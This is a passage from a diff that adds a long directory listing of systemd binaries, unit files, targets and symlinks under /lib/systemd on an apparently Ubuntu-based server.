+-rwxr-xr-x  1 root root  39K Sep 30 15:23 systemd-timesyncd
+-rwxr-xr-x  1 root root 571K Sep 30 15:23 systemd-udevd
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-update-utmp
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-user-sessions
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-veritysetup
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-volatile-root
+drwxr-xr-x  2 root root 4.0K Jul 30 22:16 system-shutdown
+drwxr-xr-x  2 root root 4.0K Dec 28  2018 system-sleep
+
+/lib/systemd/system:
+total 1.1M
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 sysinit.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 graphical.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 local-fs.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 rescue.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 timers.target.wants
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 rc-local.service.d
+drwxr-xr-x 2 root root 4.0K Oct 21 08:39 user@.service.d
+-rw-r--r-- 1 root root 1.7K Oct 18 15:52 docker.service
+-rw-r--r-- 1 root root  197 Oct 18 15:52 docker.socket
+-rw-r--r-- 1 root root  487 Oct 17 02:46 containerd.service
+lrwxrwxrwx 1 root root    9 Oct 10 18:32 sudo.service -> /dev/null
+lrwxrwxrwx 1 root root   14 Sep 30 15:23 autovt@.service -> getty@.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 bootlogs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 bootmisc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 checkfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 checkroot-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 checkroot.service -> /dev/null
+-rw-r--r-- 1 root root 1.1K Sep 30 15:23 console-getty.service
+-rw-r--r-- 1 root root 1.3K Sep 30 15:23 container-getty@.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 cryptdisks.service -> /dev/null
+lrwxrwxrwx 1 root root   13 Sep 30 15:23 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Sep 30 15:23 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Sep 30 15:23 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Sep 30 15:23 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   25 Sep 30 15:23 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root 1.1K Sep 30 15:23 debug-shell.service
+lrwxrwxrwx 1 root root   16 Sep 30 15:23 default.target -> graphical.target
+-rw-r--r-- 1 root root  797 Sep 30 15:23 emergency.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 fuse.service -> /dev/null
+-rw-r--r-- 1 root root 2.0K Sep 30 15:23 getty@.service
+-rw-r--r-- 1 root root  342 Sep 30 15:23 getty-static.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 halt.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 hostname.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 hwclock.service -> /dev/null
+-rw-r--r-- 1 root root  670 Sep 30 15:23 initrd-cleanup.service
+-rw-r--r-- 1 root root  830 Sep 30 15:23 initrd-parse-etc.service
+-rw-r--r-- 1 root root  589 Sep 30 15:23 initrd-switch-root.service
+-rw-r--r-- 1 root root  704 Sep 30 15:23 initrd-udevadm-cleanup-db.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 killprocs.service -> /dev/null
+lrwxrwxrwx 1 root root   28 Sep 30 15:23 kmod.service -> systemd-modules-load.service
+-rw-r--r-- 1 root root  717 Sep 30 15:23 kmod-static-nodes.service
+lrwxrwxrwx 1 root root   28 Sep 30 15:23 module-init-tools.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 motd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountall-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountall.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountdevsubfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountkernfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountnfs-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 mountnfs.service -> /dev/null
+-rw-r--r-- 1 root root  362 Sep 30 15:23 ondemand.service
+lrwxrwxrwx 1 root root   22 Sep 30 15:23 procps.service -> systemd-sysctl.service
+-rw-r--r-- 1 root root  609 Sep 30 15:23 quotaon.service
+-rw-r--r-- 1 root root  716 Sep 30 15:23 rc-local.service
+lrwxrwxrwx 1 root root   16 Sep 30 15:23 rc.local.service -> rc-local.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 rcS.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 reboot.service -> /dev/null
+-rw-r--r-- 1 root root  788 Sep 30 15:23 rescue.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 rmnologin.service -> /dev/null
+lrwxrwxrwx 1 root root   15 Sep 30 15:23 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Sep 30 15:23 runlevel1.target -> rescue.target
+lrwxrwxrwx 1 root root   17 Sep 30 15:23 runlevel2.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Sep 30 15:23 runlevel3.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Sep 30 15:23 runlevel4.target -> multi-user.target
+lrwxrwxrwx 1 root root   16 Sep 30 15:23 runlevel5.target -> graphical.target
+lrwxrwxrwx 1 root root   13 Sep 30 15:23 runlevel6.target -> reboot.target
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 sendsigs.service -> /dev/null
+-rw-r--r-- 1 root root 1.5K Sep 30 15:23 serial-getty@.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 single.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 stop-bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 stop-bootlogd-single.service -> /dev/null
+-rw-r--r-- 1 root root  554 Sep 30 15:23 suspend-then-hibernate.target
+-rw-r--r-- 1 root root  724 Sep 30 15:23 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  752 Sep 30 15:23 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root  752 Sep 30 15:23 systemd-backlight@.service
+-rw-r--r-- 1 root root  999 Sep 30 15:23 systemd-binfmt.service
+-rw-r--r-- 1 root root  537 Sep 30 15:23 systemd-exit.service
+-rw-r--r-- 1 root root  551 Sep 30 15:23 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Sep 30 15:23 systemd-fsckd.socket
+-rw-r--r-- 1 root root  714 Sep 30 15:23 systemd-fsck-root.service
+-rw-r--r-- 1 root root  715 Sep 30 15:23 systemd-fsck@.service
+-rw-r--r-- 1 root root  584 Sep 30 15:23 systemd-halt.service
+-rw-r--r-- 1 root root  671 Sep 30 15:23 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  541 Sep 30 15:23 systemd-hibernate.service
+-rw-r--r-- 1 root root 1.1K Sep 30 15:23 systemd-hostnamed.service
+-rw-r--r-- 1 root root  818 Sep 30 15:23 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  559 Sep 30 15:23 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  551 Sep 30 15:23 systemd-initctl.service
+-rw-r--r-- 1 root root  686 Sep 30 15:23 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.6K Sep 30 15:23 systemd-journald.service
+-rw-r--r-- 1 root root  771 Sep 30 15:23 systemd-journal-flush.service
+-rw-r--r-- 1 root root  597 Sep 30 15:23 systemd-kexec.service
+-rw-r--r-- 1 root root 1.1K Sep 30 15:23 systemd-localed.service
+-rw-r--r-- 1 root root 1.5K Sep 30 15:23 systemd-logind.service
+-rw-r--r-- 1 root root  733 Sep 30 15:23 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root 1007 Sep 30 15:23 systemd-modules-load.service
+-rw-r--r-- 1 root root 1.9K Sep 30 15:23 systemd-networkd.service
+-rw-r--r-- 1 root root  740 Sep 30 15:23 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root  593 Sep 30 15:23 systemd-poweroff.service
+-rw-r--r-- 1 root root  655 Sep 30 15:23 systemd-quotacheck.service
+-rw-r--r-- 1 root root  792 Sep 30 15:23 systemd-random-seed.service
+-rw-r--r-- 1 root root  588 Sep 30 15:23 systemd-reboot.service
+-rw-r--r-- 1 root root  833 Sep 30 15:23 systemd-remount-fs.service
+-rw-r--r-- 1 root root 1.7K Sep 30 15:23 systemd-resolved.service
+-rw-r--r-- 1 root root  724 Sep 30 15:23 systemd-rfkill.service
+-rw-r--r-- 1 root root  537 Sep 30 15:23 systemd-suspend.service
+-rw-r--r-- 1 root root  573 Sep 30 15:23 systemd-suspend-then-hibernate.service
+-rw-r--r-- 1 root root  693 Sep 30 15:23 systemd-sysctl.service
+-rw-r--r-- 1 root root 1.1K Sep 30 15:23 systemd-timedated.service
+-rw-r--r-- 1 root root 1.4K Sep 30 15:23 systemd-timesyncd.service
+-rw-r--r-- 1 root root  659 Sep 30 15:23 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  764 Sep 30 15:23 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  744 Sep 30 15:23 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  985 Sep 30 15:23 systemd-udevd.service
+-rw-r--r-- 1 root root  863 Sep 30 15:23 systemd-udev-settle.service
+-rw-r--r-- 1 root root  755 Sep 30 15:23 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  797 Sep 30 15:23 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  794 Sep 30 15:23 systemd-update-utmp.service
+-rw-r--r-- 1 root root  628 Sep 30 15:23 systemd-user-sessions.service
+-rw-r--r-- 1 root root  690 Sep 30 15:23 systemd-volatile-root.service
+-rw-r--r-- 1 root root 1.4K Sep 30 15:23 system-update-cleanup.service
+lrwxrwxrwx 1 root root   21 Sep 30 15:23 udev.service -> systemd-udevd.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 umountfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 umountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 umountroot.service -> /dev/null
+lrwxrwxrwx 1 root root   27 Sep 30 15:23 urandom.service -> systemd-random-seed.service
+-rw-r--r-- 1 root root  593 Sep 30 15:23 user@.service
+lrwxrwxrwx 1 root root    9 Sep 30 15:23 x11-common.service -> /dev/null
+-rw-r--r-- 1 root root  173 Sep 27 18:24 motd-news.service
+-rw-r--r-- 1 root root  161 Sep 27 18:24 motd-news.timer
+-rw-r--r-- 1 root root  326 Sep  3 10:05 apt-daily.service
+-rw-r--r-- 1 root root  156 Sep  3 10:05 apt-daily.timer
+-rw-r--r-- 1 root root  238 Sep  3 10:05 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Sep  3 10:05 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  127 Aug 22 23:47 fstrim.service
+-rw-r--r-- 1 root root  205 Aug 22 23:47 fstrim.timer
+-rw-r--r-- 1 root root  189 Aug 22 23:47 uuidd.service
+-rw-r--r-- 1 root root  126 Aug 22 23:47 uuidd.socket
+-rw-r--r-- 1 root root  254 Aug 15 17:25 thermald.service
+-rw-r--r-- 1 root root  326 Aug 12 19:34 php7.2-fpm.service
+-rw-r--r-- 1 root root  340 Jul 12 08:40 snapd.autoimport.service
+-rw-r--r-- 1 root root  320 Jul 12 08:40 snapd.core-fixup.service
+-rw-r--r-- 1 root root  172 Jul 12 08:40 snapd.failure.service
+-rw-r--r-- 1 root root  322 Jul 12 08:40 snapd.seeded.service
+-rw-r--r-- 1 root root  477 Jul 12 08:40 snapd.service
+-rw-r--r-- 1 root root  372 Jul 12 08:40 snapd.snap-repair.service
+-rw-r--r-- 1 root root  281 Jul 12 08:40 snapd.snap-repair.timer
+-rw-r--r-- 1 root root  281 Jul 12 08:40 snapd.socket
+-rw-r--r-- 1 root root  521 Jul 12 08:40 snapd.system-shutdown.service
+-rw-r--r-- 1 root root  505 Jun 10 18:05 dbus.service
+-rw-r--r-- 1 root root  106 Jun 10 18:05 dbus.socket
+-rw-r--r-- 1 root root  383 Jun  4 09:59 blk-availability.service
+-rw-r--r-- 1 root root  341 Jun  4 09:59 dm-event.service
+-rw-r--r-- 1 root root  248 Jun  4 09:59 dm-event.socket
+-rw-r--r-- 1 root root  345 Jun  4 09:59 lvm2-lvmetad.service
+-rw-r--r-- 1 root root  215 Jun  4 09:59 lvm2-lvmetad.socket
+-rw-r--r-- 1 root root  300 Jun  4 09:59 lvm2-lvmpolld.service
+-rw-r--r-- 1 root root  213 Jun  4 09:59 lvm2-lvmpolld.socket
+-rw-r--r-- 1 root root  693 Jun  4 09:59 lvm2-monitor.service
+-rw-r--r-- 1 root root  403 Jun  4 09:59 lvm2-pvscan@.service
+lrwxrwxrwx 1 root root    9 Jun  4 09:59 lvm2.service -> /dev/null
+-rw-r--r-- 1 root root  466 May 14 07:05 open-vm-tools.service
+-rw-r--r-- 1 root root  385 May 14 07:05 vgauth.service
+drwxr-xr-x 2 root root 4.0K May  6 14:10 halt.target.wants
+drwxr-xr-x 2 root root 4.0K May  6 14:10 initrd-switch-root.target.wants
+drwxr-xr-x 2 root root 4.0K May  6 14:10 kexec.target.wants
+drwxr-xr-x 2 root root 4.0K May  6 14:10 poweroff.target.wants
+drwxr-xr-x 2 root root 4.0K May  6 14:10 reboot.target.wants
+-rw-r--r-- 1 root root  652 Apr 25  2019 auth-rpcgss-module.service
+-rw-r--r-- 1 root root  272 Apr 25  2019 nfs-client.target
+lrwxrwxrwx 1 root root    9 Apr 25  2019 nfs-common.service -> /dev/null
+-rw-r--r-- 1 root root  375 Apr 25  2019 nfs-config.service
+-rw-r--r-- 1 root root  336 Apr 25  2019 nfs-idmapd.service
+-rw-r--r-- 1 root root  391 Apr 25  2019 rpc-gssd.service
+-rw-r--r-- 1 root root  497 Apr 25  2019 rpc-statd-notify.service
+-rw-r--r-- 1 root root  489 Apr 25  2019 rpc-statd.service
+-rw-r--r-- 1 root root  402 Apr 25  2019 rpc-svcgssd.service
+-rw-r--r-- 1 root root  146 Apr 25  2019 run-rpc_pipefs.mount
+-rw-r--r-- 1 root root  312 Apr 23  2019 console-setup.service
+-rw-r--r-- 1 root root  287 Apr 23  2019 keyboard-setup.service
+-rw-r--r-- 1 root root  330 Apr 23  2019 setvtrgb.service
+-rw-r--r-- 1 root root  481 Apr 10  2019 mdadm-grow-continue@.service
+-rw-r--r-- 1 root root  210 Apr 10  2019 mdadm-last-resort@.service
+-rw-r--r-- 1 root root  179 Apr 10  2019 mdadm-last-resort@.timer
+lrwxrwxrwx 1 root root    9 Apr 10  2019 mdadm.service -> /dev/null
+-rw-r--r-- 1 root root  670 Apr 10  2019 mdadm-shutdown.service
+lrwxrwxrwx 1 root root    9 Apr 10  2019 mdadm-waitidle.service -> /dev/null
+-rw-r--r-- 1 root root  388 Apr 10  2019 mdmonitor.service
+-rw-r--r-- 1 root root 1.1K Apr 10  2019 mdmon@.service
+-rw-r--r-- 1 root root  404 Apr  9  2019 ureadahead.service
+-rw-r--r-- 1 root root  250 Apr  9  2019 ureadahead-stop.service
+-rw-r--r-- 1 root root  242 Apr  9  2019 ureadahead-stop.timer
+-rw-r--r-- 1 root root  412 Apr  4  2019 plymouth-halt.service
+-rw-r--r-- 1 root root  426 Apr  4  2019 plymouth-kexec.service
+lrwxrwxrwx 1 root root   27 Apr  4  2019 plymouth-log.service -> plymouth-read-write.service
+-rw-r--r-- 1 root root  421 Apr  4  2019 plymouth-poweroff.service
+-rw-r--r-- 1 root root  194 Apr  4  2019 plymouth-quit.service
+-rw-r--r-- 1 root root  200 Apr  4  2019 plymouth-quit-wait.service
+-rw-r--r-- 1 root root  244 Apr  4  2019 plymouth-read-write.service
+-rw-r--r-- 1 root root  416 Apr  4  2019 plymouth-reboot.service
+lrwxrwxrwx 1 root root   21 Apr  4  2019 plymouth.service -> plymouth-quit.service
+-rw-r--r-- 1 root root  532 Apr  4  2019 plymouth-start.service
+-rw-r--r-- 1 root root  291 Apr  4  2019 plymouth-switch-root.service
+-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
+-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
+-rw-r--r-- 1 root root  463 Mar 28  2019 iscsid.service
+-rw-r--r-- 1 root root  242 Feb  6  2019 apport-autoreport.service
+-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
+lrwxrwxrwx 1 root root    9 Dec 28  2018 screen-cleanup.service -> /dev/null
+-rw-r--r-- 1 root root  175 Dec 12  2018 iscsid.socket
+-rw-r--r-- 1 root root  987 Dec 12  2018 open-iscsi.service
+-rw-r--r-- 1 root root  605 Nov 23  2018 lxd.service
+-rw-r--r-- 1 root root  320 Nov 23  2018 lxd-containers.service
+-rw-r--r-- 1 root root  197 Nov 23  2018 lxd.socket
+-rw-r--r-- 1 root root  311 Nov 23  2018 lxcfs.service
+-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
+-rw-r--r-- 1 root root  212 Jul 10  2018 apport-autoreport.path
+-rw-r--r-- 1 root root  456 Jun 28  2018 ebtables.service
+-rw-r--r-- 1 root root  309 May 30  2018 pollinate.service
+-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
+-rw-r--r-- 1 root root 1013 Apr  6  2018 nginx.service
+-rw-r--r-- 1 root root  175 Mar 27  2018 polkit.service
+-rw-r--r-- 1 root root  544 Mar 22  2018 apparmor.service
+-rw-r--r-- 1 root root  169 Feb 20  2018 atd.service
+-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
+-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
+-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
+-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
+-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
+-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
+-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
+-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
+-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
+-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
+-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
+-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
+-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
+-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
+-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
+-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
+-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
+-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
+-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
+-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
+-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
+-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
+-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
+-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
+-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
+-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
+-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
+-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
+-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
+-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
+-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
+-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
+-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
+-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
+-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
+-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
+-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
+-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
+-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
+-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
+-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
+-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
+-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
+-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
+-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
+-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
+-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
+-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
+-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
+-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
+-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
+-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
+-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
+-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
+-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
+-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
+-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
+-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
+-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
+-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
+-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
+-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
+-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
+-rw-r--r-- 1 root root  493 Jan 25  2018 ssh.service
+-rw-r--r-- 1 root root  244 Jan 25  2018 ssh@.service
+-rw-r--r-- 1 root root  155 Jan 17  2018 phpsessionclean.service
+-rw-r--r-- 1 root root  144 Jan 17  2018 phpsessionclean.timer
+-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
+-rw-r--r-- 1 root root  741 Dec 18  2017 accounts-daemon.service
+-rw-r--r-- 1 root root  246 Nov 20  2017 apport-forward.socket
+-rw-r--r-- 1 root root  142 Nov 20  2017 apport-forward@.service
+-rw-r--r-- 1 root root  251 Nov 16  2017 cron.service
+-rw-r--r-- 1 root root  266 Aug 15  2017 ufw.service
+lrwxrwxrwx 1 root root   15 May  5  2017 portmap.service -> rpcbind.service
+-rw-r--r-- 1 root root  493 May  5  2017 rpcbind.service
+-rw-r--r-- 1 root root  151 May  5  2017 rpcbind.socket
+-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.path
+-rw-r--r-- 1 root root  234 Apr 22  2017 acpid.service
+-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.socket
+-rw-r--r-- 1 root root  626 Nov 28  2016 ifup@.service
+-rw-r--r-- 1 root root  735 Nov 25  2016 networking.service
+-rw-r--r-- 1 root root  567 Aug  3  2016 nfs-utils.service
+-rw-r--r-- 1 root root   98 Aug  3  2016 proc-fs-nfsd.mount
+-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Sep 30 15:23 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Sep 30 15:23 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Sep 30 15:23 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Sep 30 15:23 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Sep 30 15:23 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Sep 30 15:23 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Jun 10 18:05 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 20 Sep 30 15:23 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Sep 30 15:23 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Sep 30 15:23 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 28 Sep 30 15:23 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Sep 30 15:23 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 32 Sep 30 15:23 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Sep 30 15:23 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Sep 30 15:23 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 36 Sep 30 15:23 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Sep 30 15:23 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 30 Sep 30 15:23 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 27 Sep 30 15:23 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 32 Sep 30 15:23 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 36 Sep 30 15:23 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Sep 30 15:23 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Sep 30 15:23 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Sep 30 15:23 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 37 Sep 30 15:23 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Sep 30 15:23 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 24 Sep 30 15:23 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 31 Sep 30 15:23 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 30 Sep 30 15:23 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx 1 root root 30 Apr  4  2019 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Sep 30 15:23 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Sep 30 15:23 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
